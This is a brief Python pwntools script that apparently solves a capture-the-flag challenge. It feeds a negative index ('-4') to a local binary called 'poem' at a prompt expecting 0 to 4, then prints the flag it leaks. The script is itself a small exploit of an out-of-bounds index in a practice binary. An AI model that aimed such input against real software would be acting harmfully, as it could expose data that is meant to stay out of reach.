import pwn

pwn.context.log_level = 'DEBUG'
pwn.context.binary = "./poem"


def solve(io):
    io.sendafter(b'Number[0-4]: ', b'-4\n')
    flag = io.recvline()
    print(f'flag: {flag}')


with pwn.process('./poem') as io:
    solve(io)

